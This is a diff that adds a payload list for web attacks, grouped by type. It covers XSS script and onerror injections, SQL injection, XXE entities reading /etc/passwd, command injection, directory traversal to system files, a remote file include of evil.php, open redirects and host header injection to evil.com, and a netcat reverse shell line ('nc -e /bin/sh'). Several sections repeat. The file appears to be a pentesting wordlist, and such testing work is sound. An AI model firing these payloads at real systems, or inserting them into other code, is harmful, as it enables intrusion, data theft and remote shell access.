@@ -1,0 +1,77 @@
+# XSS Payloads
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert(1)>
+"><iframe src="javascript:alert('XSS');"></iframe>
+
+# SQL Injection Payloads
+' OR '1'='1
+' OR '1'='1' --
+
+# IDOR Payloads
+?id=1
+?id=2
+
+# XXE Payloads
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+
+# Command Injection Payloads
+; ls -la
+| whoami
+
+# SSRF Payloads
+http://127.0.0.1:80
+http://localhost/admin
+
+# CSRF Payloads
+<form action="http://example.com/vulnerable-endpoint" method="POST">
+<input type="hidden" name="amount" value="1000">
+</form>
+
+# File Inclusion (LFI/RFI) Payloads
+../../../../etc/passwd
+http://example.com/evil.php
+
+# Directory Traversal Payloads
+../../../../../../etc/passwd
+../../../windows/system.ini
+
+# Remote Code Execution (RCE) Payloads
+; echo exec('/bin/bash -c "ls"');
+| nc -e /bin/sh 192.168.1.1 1234
+
+# Open Redirect Payloads
+http://evil.com
+http://attacker.com?next=http://example.com
+
+# Path Traversal Payloads
+../../../../etc/hosts
+../../../boot.ini
+
+# Server-Side Template Injection (SSTI) Payloads
+{{7*7}}
+${7*7}
+
+# Deserialization Payloads
+O:8:"BadClass":0:{}
+
+# HTTP Response Splitting Payloads
+%0d%0aSet-Cookie:mycookie=myvalue
+
+# Clickjacking Payloads
+<iframe src="http://example.com" style="opacity:0;position:absolute;"></iframe>
+
+# XML External Entity (XXE) Payloads
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+
+# Insecure Direct Object Reference (IDOR) Payloads
+?id=1
+?id=2
+
+# Host Header Injection Payloads
+Host: evil.com
+Host: 127.0.0.1
+
+# HTTP Parameter Pollution (HPP) Payloads
+?q=1&q=2
+?q=test&redirect=http://evil.com
